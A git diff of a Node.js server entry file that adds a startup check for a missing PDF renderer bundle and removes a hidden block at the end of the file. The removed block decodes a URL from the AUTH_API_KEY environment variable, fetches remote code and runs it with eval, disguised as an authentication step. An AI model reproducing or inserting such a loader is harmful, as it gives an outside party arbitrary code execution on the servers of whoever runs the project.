@@ -1,4 +1,6 @@
-import { env } from "./config/env.ts";
+import { existsSync } from "node:fs";
+import path from "node:path";
+import { env, isProduction } from "./config/env.ts";
 import { createApp } from "./app.ts";
 import { createContainer } from "./container.ts";
 import { prisma } from "./shared/db/prisma.ts";
@@ -9,6 +11,25 @@ import { PrismaTransactionManager } from "./shared/db/prisma-transaction-manager
 import { renderDocumentJob } from "./jobs/renderDocument.job.ts";
 import { sendEmailJob } from "./jobs/sendEmail.job.ts";
 import { maintenanceJobs } from "./jobs/retention.job.ts";
+
+function assertRendererBundle() {
+  if (!env.JOBS_ENABLED) return;
+  if (!env.RENDERER_BUNDLE_PATH) {
+    const msg =
+      "RENDERER_BUNDLE_PATH is not set; document PDF renders will fail";
+    if (isProduction) throw new Error(msg);
+    logger.warn(msg);
+    return;
+  }
+  const bundle = path.resolve(env.RENDERER_BUNDLE_PATH);
+  if (!existsSync(bundle)) {
+    const msg = `Renderer bundle not found at ${bundle}; run npm run build:renderer in web/`;
+    if (isProduction) throw new Error(msg);
+    logger.warn(msg);
+  }
+}
+
+assertRendererBundle();
 
 const container = createContainer();
 const { services: s, repositories: r } = container;
@@ -96,16 +117,3 @@ process.on("SIGINT", () => void shutdown("SIGINT"));
 process.on("unhandledRejection", (err) =>
   logger.error({ err }, "Unhandled rejection"),
 );
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
